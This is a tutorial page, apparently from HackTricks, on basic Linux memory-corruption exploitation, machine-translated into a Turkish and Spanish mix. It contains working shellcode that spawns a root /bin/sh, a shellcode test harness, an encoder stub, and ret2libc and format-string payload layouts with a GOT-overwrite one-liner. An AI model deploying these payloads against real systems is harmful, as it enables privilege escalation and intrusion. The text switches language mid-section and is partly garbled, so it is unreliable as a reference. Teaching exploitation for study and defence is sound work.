# Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentation fault or segment violation: Bir işleme atanmamış bir bellek adresine erişilmeye çalışıldığında oluşur.

Bir program içindeki bir fonksiyonun adresini elde etmek için şunu yapabilirsiniz:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execve Çağrısı

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Kernel kesmelerini görüntüle: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'ı temizle\
xor ebx, ebx ; ebx = 0 çünkü geçirilecek bir argüman yok\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Sistem çağrısını çalıştır

**nasm -f elf assembly.asm** —> Bir .o dosyası döndürür\
**ld assembly.o -o shellcodeout** —> Derlenmiş kod içeren yürütülebilir dosyayı verir ve **objdump** ile opcode'ları çıkarabiliriz\
**objdump -d -Mintel ./shellcodeout** —> Gerçekten shellcodemuz olduğunu görmek ve opcode'ları çıkarmak için

**Shellcodenin çalıştığını doğrulama**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Sistem çağrılarının doğru yapıldığını görmek için önceki program derlenmeli ve sistem çağrıları **strace ./DERLENMİŞ_PROGRAM** içinde görünmelidir.

Shellcode'lar oluşturulurken bir hile yapılabilir. İlk talimat bir çağrıya bir sıçrama yapmaktır. Çağrı, orijinal kodu çağırır ve aynı zamanda EIP'yi yığına yerleştirir. Çağrı talimatından sonra ihtiyacımız olan dizeyi eklemişizdir, bu nedenle bu EIP ile dizeyi işaretleyebilir ve aynı zamanda kodu devam ettirebiliriz.

ÖRNEK **HİLE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stack Kullanarak EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Yumurta Avcısı:**

Bir işleme ilişkilendirilmiş bellek sayfalarını dolaşarak orada saklanan shellcode'u arayan küçük bir kod parçasıdır (shellcode'da yer alan bir imza arar). Kod enjekte etmek için sadece küçük bir alanın olduğu durumlarda faydalıdır.

**Polimorfik Shell Kodları**

Küçük kodlarla şifrelenmiş kabuklardır ve bunları çözen ve onlara atlayan küçük kodlar içerirler, Call-Pop hilesini kullanarak şifrelenmiş bir örnek şöyle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Frame Pointer (EBP) Saldırısı**

EBP'yi değiştirebiliyor ancak EIP'yi değiştiremiyorsak kullanışlıdır.

Bir fonksiyondan çıkarken aşağıdaki assembly kodunun çalıştığını biliyoruz:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, si se puede modificar el EBP al salir de una función (fvuln) que ha sido llamada por otra función, cuando la función que llamó a fvuln finalice, su EIP puede ser modificado.

En fvuln se puede introducir un EBP falso que apunte a un sitio donde esté la dirección de la shellcode + 4 (hay que sumarle 4 por el pop). Así, al salir de la función, se meterá en ESP el valor de &(\&Shellcode)+4, con el pop se le restará 4 al ESP y este apuntará a la dirección de la shellcode cuando se ejecute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\
Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la dirección de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. Métodos return to Libc**

Método útil cuando el stack no es ejecutable o deja un buffer muy pequeño para modificar.

El ASLR provoca que en cada ejecución las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este método puede no ser efectivo en ese caso. Para servidores remotos, como el programa está siendo ejecutado constantemente en la misma dirección sí puede ser útil.

* **cdecl(C declaration)** Mete los argumentos en el stack y tras salir de la función limpia la pila
* **stdcall(standard call)** Mete los argumentos en la pila y es la función llamada la que la limpia
* **fastcall** Mete los dos primeros argumentos en registros y el resto en la pila

Se pone la dirección de la instrucción system de libc y se le pasa como argumento el string “/bin/sh”, normalmente desde una variable de entorno. Además, se usa la dirección a la función exit para que una vez que no se requiera más la shell, salga el programa sin dar problemas (y escribir logs).

**export SHELL=/bin/sh**

Para encontrar las direcciones que necesitaremos se puede mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** —> Da la dirección de todas las funciones que usa el programa al cargarse\
(Dentro de un start o algun breakpoint): **x/500s $esp** —> Buscamos dentro de aqui el string /bin/sh

Una vez tengamos estas direcciones el **exploit** quedaría:

“A” \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s aunque mejor si es el EBP real para evitar fallos de segmentación) + Dirección de **system** (sobreescribirá el EIP) + Dirección de **exit** (al salir de system(“/bin/sh”) se llamará a esta función pues los primero 4bytes del stack son tratados como la siguiente dirección del EIP a ejecutar) + Dirección de “**/bin/sh**” (será el parámetro pasado a system)

De esta forma el EIP se sobreescribirá con la dirección de system la cual recibirá como parámetro el string “/bin/sh” y al salir de este ejecutará la función exit().

Es posible encontrarse en la situación de que algún byte de alguna dirección de alguna función sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha función pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la función directamente (por ejemplo con > x/8i system-4).

Este método funciona pues al llamar a una función como system usando el opcode **ret** en vez de **call**, la función entiende que los primeros 4bytes serán la dirección **EIP** a la que volver.

Una técnica interesante con este método es el llamar a **strncpy()** para mover un payload del stack al heap y posteriormente usar **gets()** para ejecutar dicho payload.

Otra técnica interesante es el uso de **mprotect()** la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o servía en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecución). Con este ataque se podría volver a configurar la pila como ejecutable.

**Encadenamiento de funciones**

Basándonos en la técnica anterior, esta forma de exploit consiste en:\
Relleno + \&Función1 + \&pop;ret; + \&arg\_fun1 + \&Función2 + \&pop;ret; + \&arg\_fun2 + …

De esta forma se pueden encadenar funciones a las que llamar. Además, si se quieren usar funciones con varios argumentos, se pueden poner los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar dirección a un sitio con opcodes: pop, pop, pop, pop, ret —> **objdump -d ejecutable**

**Encadenamiento mediante falseo de frames (encadenamiento de EBPs)**

Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecución de varias funciones a través del EBP y de "leave;ret"

RELLENO

* Situamos en el EBP un EBP falso que apunta a: 2º EBP\_falso + la función a ejecutar: (\&system() + \&leave;ret + &“/bin/sh”)
* En el EIP ponemos de dirección una función &(leave;ret)

Iniciamos la shellcode con la dirección a la siguiente parte de la shellcode, por ej: 2ºEBP\_falso + \&system() + &(leave;ret;) + &”/bin/sh”

el 2ºEBP sería: 3ºEBP\_falso + \&system() + &(leave;ret;) + &”/bin/ls”

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguirá una shellcode fácilmente divisible por pequeños trozos de memoria.

(Se encadena la ejecución de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)

## **5.Métodos complementarios**

**Ret2Ret**

Útil para cuando no se puede meter una dirección del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicación de la shellcode. Pero, la función vulnerable acepte un parámetro (la shellcode irá aquí).

De esta forma, al cambiar el EIP por una dirección a un **ret**, se cargará la siguiente dirección (que es la dirección del primer argumento de la función). Es decir, se cargará la shellcode.

El exploit quedaría: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la dirección al parámetro pasado)

Al parecer funciones como **strncpy** una vez completas eliminan de la pila la dirección donde estaba guardada la shellcode imposibilitando esta técnica. Es decir, la dirección que pasan a la función como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa muere.
```
**Ret2PopRet**
```
Si kontrolümüz birinci argüman üzerinde yoksa ancak ikinci veya üçüncü argüman üzerinde kontrolümüz varsa, EIP'yi pop-ret veya pop-pop-ret adresine üzerine yazabiliriz.

**Murat Tekniği**

Linux'ta tüm programlar 0xbfffffff'den başlayarak haritalanır.

Linux'ta yeni bir işlem için yığının nasıl oluşturulduğunu göz önünde bulundurarak, programın yalnızca shellcode'un bulunduğu bir ortamda başlatılmasını sağlayacak bir exploit geliştirilebilir. Bu adres şu şekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Bu şekilde, shellcode'un bulunduğu ortam değişkeninin adresi kolayca elde edilebilir.

Bu, execle fonksiyonunun istenilen sadece çevresel değişkenleri içeren bir ortam oluşturmasına izin vermesi sayesinde mümkündür.

**ESP'ye Atla: Windows Tarzı**

ESP'nin her zaman yığının başlangıcına işaret etmesi nedeniyle, bu teknik EIP'yi **jmp esp** veya **call esp** çağrısının adresiyle değiştirmeyi içerir. Böylece, EIP'nin üzerine yazıldıktan sonra shellcode kaydedilir çünkü **ret** komutunu çalıştırdıktan sonra ESP, shellcode'un kaydedildiği yerde olacak şekilde bir sonraki adrese işaret edecektir.

Windows veya Linux'ta ASLR etkin değilse, **jmp esp** veya **call esp**'yi paylaşılan bir nesnede saklanmış olarak çağırabilirsiniz. ASLR etkinse, zafiyetli programın içinde arama yapılabilir.

Ayrıca, shellcode'u yığının ortasına yerleştirmek yerine EIP'nin bozulmasından sonra shellcode'u yerleştirebilmek, fonksiyonun ortasında yürütülen push veya pop komutlarının shellcode'a dokunmamasını sağlar (bu, fonksiyon yığınının ortasına yerleştirilirse olabilecek bir durumdur).

Benzer şekilde, bir fonksiyonun shellcode'un nerede saklandığını döndürdüğünü biliyorsak, **call eax** veya **jmp eax (ret2eax)** çağrılabilir.

**Tamsayı Taşmaları**

Bu tür taşmalar, bir değişkenin geçirilen kadar büyük bir sayıyı desteklemeye hazır olmadığında meydana gelir, muhtemelen işaretli ve işaretsiz değişkenler arasındaki karışıklıktan kaynaklanabilir, örneğin:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Önceki örnekte programın 2 parametre beklediğini görüyoruz. İlk parametre takip eden dizenin uzunluğu ve ikinci parametre dizedir.

Eğer ilk parametre olarak negatif bir sayı verirsek, len < 256 çıkacaktır ve bu filtreyi geçeceğiz, ayrıca strlen(buffer) da l'den daha küçük olacaktır, çünkü l unsigned int türündedir ve çok büyük olacaktır.

Bu tür taşmalarda, programın işlemine bir şeyler yazmayı hedeflemiyor, ancak diğer zayıf noktaları sömürmek için kötü tasarlanmış filtreleri aşmayı amaçlıyor.

**Başlatılmamış Değişkenler**

Başlatılmamış bir değişkenin alabileceği değeri bilinmez ve bunu gözlemlemek ilginç olabilir. Önceki işlevdeki bir değişkenin aldığı değeri alabilir ve bu değişken saldırgan tarafından kontrol edilebilir.

## **Biçim Dizileri**

C'de **`printf`** işlevi bazı dizeleri **yazdırmak** için kullanılabilen bir işlevdir. Bu işlevin beklediği **ilk parametre**, **biçimleyicilerle** birlikte **ham metindir**. Beklenen **takip eden parametreler**, ham metinden **biçimleyicileri** **yerine koymak için** beklenen **değerlerdir**.

Zararlı bir metin, bu işlevin ilk argümanı olarak kullanıldığında zafiyet ortaya çıkar. Saldırgan, **printf biçim dizesi yeteneklerini kötüye kullanarak** özel bir giriş oluşturabilir ve bu şekilde **herhangi bir veriyi herhangi bir adrese yazabilir**. Bu şekilde **keyfi kod yürütebilir**.

Biçimleyiciler:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** belirtilen adresin içine yazılan byte sayısını yazar. Yazılması gereken onaltılık sayı kadar byte yazarak istediğiniz veriyi yazabilirsiniz.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Bu, program tarafından kullanılan **harici fonksiyonların adreslerini** içeren tablodur.

Bu tablonun adresini şu komutla alın: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

GEF'de **yürütülebilir dosyayı** yükledikten sonra **GOT'da** bulunan **fonksiyonları görebilirsiniz**: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEF kullanarak **hata ayıklama** oturumu başlatabilir ve **`got`** komutunu çalıştırarak got tablosunu görebilirsiniz:

![](<../../.gitbook/assets/image (621).png>)

Bir ikili dosyada GOT, **fonksiyonların adreslerine** veya **fonksiyon adresini yükleyecek** olan **PLT** bölümüne sahiptir. Bu saldırının amacı, daha sonra **çalıştırılacak bir fonksiyonun GOT girişini** **`system`** **fonksiyonunun PLT adresiyle değiştirmektir**. İdeal olarak, **kontrolünüzdeki parametrelerle çağrılacak bir fonksiyonun GOT'unu** **değiştireceksiniz**.

Eğer **`system`** **betiğin içinde kullanılmıyorsa**, sistem fonksiyonunun GOT'ta bir girişi **olmayacaktır**. Bu senaryoda, öncelikle `system` fonksiyonunun adresini **sızdırmanız gerekecektir**.

**Procedure Linkage Table**, çözüm gerektiren tüm gerekli **sembolleri depolayan** ELF dosyasındaki **salt okunur** bir tablodur. Bu fonksiyonlardan biri çağrıldığında, **GOT** **akışı** **PLT'ye yönlendirecek** ve böylece **fonksiyonun adresini çözebilecek ve GOT'a yazabilecektir**.\
Sonra, o adrese bir çağrı yapıldığında **fonksiyon** doğrudan **çözülmeden** çağrılır.

PLT adreslerini **`objdump -j .plt -d ./vuln_binary`** ile görebilirsiniz.

### **Saldırı Akışı**

Önce açıklandığı gibi, amacımız daha sonra çağrılacak bir **fonksiyonun GOT tablosundaki adresini değiştirmektir**. İdeali, yürütülebilir bir bölümde bulunan bir **shellcode'un adresini ayarlamaktır**, ancak muhtemelen bir yürütülebilir bölüme bir shellcode yazamayacaksınız.\
Bu nedenle, **kullanıcının argümanlarını alan bir fonksiyonu** **üzerine yazmak** ve onu **`system`** **fonksiyonuna işaret etmek** farklı bir seçenektir.

Adresi yazmak için genellikle 2 adım atılır: **İlk olarak adresin 2 baytını yazarsınız** ve ardından diğer 2'sini. Bunu yapmak için **`$hn`** kullanılır.

**HOB**, adresin 2 yüksek baytına **çağrılır**\
**LOB**, adresin 2 düşük baytına **çağrılır**

Bu nedenle, format dizesinin nasıl çalıştığından dolayı önce \[HOB, LOB]'den **daha küçük olanını yazmanız** ve ardından diğerini yazmanız gerekir.

Eğer HOB < LOB ise\
`[adres+2][adres]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Eğer HOB > LOB ise\
`[adres+2][adres]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format Dizesi Saldırısı Şablonu**

Format dizilerini kullanarak GOT'u sömürmek için bir **şablon** bulabilirsiniz:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Temelde, bu, programın **bitmeden önce çağrılacak** olan **fonksiyonları içeren** bir yapıdır. Bu, **sadece bir adrese atlayarak shellcode'unuzu çağırabilirsiniz** veya **format dizesini ikinci kez sömürmek için tekrar main'e dönmek zorunda kaldığınız durumlarda** ilginç olabilir.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Not edin ki bu **sonsuz döngü** oluşturmayacak çünkü ana programa geri döndüğünüzde canary fark edecek, yığının sonu bozulmuş olabilir ve işlev tekrar çağrılmayacak. Bu sayede zafiyetin **1 kez daha yürütülmesine** izin verilecek.

### **İçeriği Dökümlemek için Format Dizileri**

Bir format dizesi ayrıca programın belleğinden içerik **dökmek** için kötüye kullanılabilir.\
Örneğin, aşağıdaki durumda yığında bir bayrağa işaret eden bir **yerel değişken** var. Eğer **bellekte bayrağa işaret eden işaretçinin** nerede olduğunu **bulursanız**, **printf'in** o **adrese erişmesini** sağlayabilir ve **bayrağı yazdırabilirsiniz**:

Yani, bayrak **0xffffcf4c** adresinde

![](<../../.gitbook/assets/image (618) (2).png>)

Ve sızıntıdan **bayrağa işaret eden işaretçinin** **8.** parametrede olduğunu görebilirsiniz:

![](<../../.gitbook/assets/image (623).png>)

Bu nedenle, **8. parametreye erişerek** bayrağı alabilirsiniz:

![](<../../.gitbook/assets/image (624).png>)

**Önceki zafiyeti** takip ederek ve içerik sızdırabileceğinizi fark ederek **`printf`**'e **işaretçileri ayarlayabilir** ve **yürütülebilir** olan bölüme **tamamen dökebilirsiniz**!

### **DTOR**

{% hint style="danger" %}
Günümüzde bir dtor bölümü olan bir ikili dosya bulmak çok **garip**.
{% endhint %}

Yıkıcılar, programın **sona ermeden önce yürütülen işlevlerdir**.\
Bir **adresi** bir **shellcode'a yazmayı** başarırsanız **`__DTOR_END__`** içinde, bu programın sona ermeden önce **yürütülecektir**.\
Bu bölümün adresini alın:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Genellikle **DTOR** bölümünü `ffffffff` ve `00000000` değerleri **arasında** bulacaksınız. Bu yüzden sadece bu değerleri görüyorsanız, bu, **herhangi bir işlevin kaydedilmediği anlamına gelir**. Bu nedenle, **`00000000`** değerini **üzerine yazarak** onu çalıştırmak için **shellcode** adresiyle değiştirin.

### **Format Strings to Buffer Overflows**

**sprintf**, biçimlendirilmiş bir dizeyi bir **değişkene taşır**. Bu nedenle, bir dizenin biçimlendirmesini **kullanarak**, içeriğin kopyalandığı değişkende bir **tampon taşmasına neden olabilirsiniz**.\
Örneğin, yük `%.44xAAAA`, değişkene **44B+"AAAA" yazacaktır**, bu da bir tampon taşmasına neden olabilir.

### **\_\_atexit Yapıları**

{% hint style="danger" %}
Bugünlerde bunu **saldırmak çok garip**.
{% endhint %}

**`atexit()`**, **parametre olarak başka işlevlerin geçirildiği bir işlevdir**. Bu **işlevler**, bir **`exit()`** veya **main**'in **dönüşü** sırasında **çalıştırılacaktır**.\
Bu işlevlerden herhangi birinin adresini örneğin bir shellcode'a yönlendirebilirseniz, **işlemi kontrol edersiniz**, ancak bu şu anda daha karmaşıktır.\
Şu anda **çalıştırılacak işlevlerin adresleri** birkaç yapı arkasında gizlenmiştir ve sonunda işlevlerin adresleri değil, **XOR ile şifrelenmiş ve rastgele bir anahtarla kaydırılmıştır**. Bu nedenle, bu saldırı vektörü şu anda **en azından x86** ve **x64\_86** için çok kullanışlı değildir.\
**Şifreleme işlevi** **`PTR_MANGLE`**'dır. m68k, mips32, mips64, aarch64, arm, hppa gibi **diğer mimariler**, girdi olarak aldığı gibi **şifrelemeyi uygulamaz**. Bu nedenle, bu mimariler bu vektör tarafından saldırıya uğrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Bugünlerde bunu **saldırmak çok garip**.
{% endhint %}

**`Setjmp()`**, **bağlamı (kayıtları) kaydetmeyi sağlar**\
**`longjmp()`**, **bağlamı geri yüklemeyi sağlar**.\
Kaydedilen kayıtlar: `EBX, ESI, EDI, ESP, EIP, EBP`\
Olan şudur ki EIP ve ESP, **`PTR_MANGLE`** işlevi tarafından geçirilir, bu nedenle **bu saldırıya duyarlı mimariler yukarıdakiyle aynıdır**.\
Hata kurtarma veya kesmeler için kullanışlıdır.\
Ancak okuduklarıma göre, diğer kayıtlar korunmamaktadır, bu nedenle, çağrılan işlevin içinde `call ebx`, `call esi` veya `call edi` varsa kontrol ele geçirilebilir. Veya EBP değiştirilerek ESP değiştirilebilir.

**VTable ve VPTR in C++**

Her sınıfın bir **Vtable**'ı vardır, bu bir **yöntemler dizisidir**.

Her bir **sınıfın nesnesi**, sınıfının dizisinin bir **işaretçisi olan bir VPtr'ye** sahiptir. VPtr, her nesnenin başlığının bir parçasıdır, bu nedenle VPtr'nin **üzerine yazılması başarılı olursa**, bir işlevi çalıştırmak için VPtr'nin bir sahte yönteme **yönlendirilmesi** mümkün olabilir ve bu da shellcode'a gidebilir.

## **Önleyici ve Kaçınma Önlemleri**

**Printf'e Return**

Bir tampon taşmasını bir biçim dizesi hatasına dönüştürmek için bir tekniktir. EIP'yi bir işlevin printf'ine yönlendirmek ve işlem durumu hakkında değerler elde etmek için manipüle edilmiş bir biçim dizesini argüman olarak geçirmekten oluşur.

**Kütüphanelere Saldırı**

Kütüphaneler, 16 bit rastgelelikle bir konumda bulunur = 65636 olası adres. Bir sunucu saldırıya uğrayabilirse fork() çağrısı yaparsa, bellek adresleri alanı çocuk süreçte kopyalanır ve değişmez. Bu nedenle, libc'nin usleep() işlevine brute force saldırısı yapılabilir, "16" argümanı olarak geçirilerek normalden daha uzun sürede yanıt verirse, bu işlev bulunmuş olur. Bu işlevin nerede olduğunu bildiğinizde delta_mmap alınabilir ve diğerleri hesaplanabilir.

ASLR'nin çalıştığından emin olmanın tek yolu 64 bit mimarisini kullanmaktır. Burada brute force saldırıları yoktur.

### Relro

**Relro (Salt Okunur Yer Değiştirme)**, bellek izinlerini NX ile benzer şekilde etkiler. Fark, NX ile yığını yürütülebilir hale getirirken, RELRO **belirli şeyleri salt okunur hale getirir**, böylece **onlara yazamayız**. Bu genellikle bir **`got` tablosu üzerine yazma** işlemini yapamamamızı engelleyen en yaygın engel olarak karşıma çıktı. `got` tablosu, libc işlevlerinin adreslerini tutar, böylece ikili dosya bu adresleri bilir ve onları çağırabilir. Bir ikili dosya için `got` tablosu girişi için bellek izinlerinin nasıl olduğuna bakalım. RELRO ile:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Relro olmadan:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
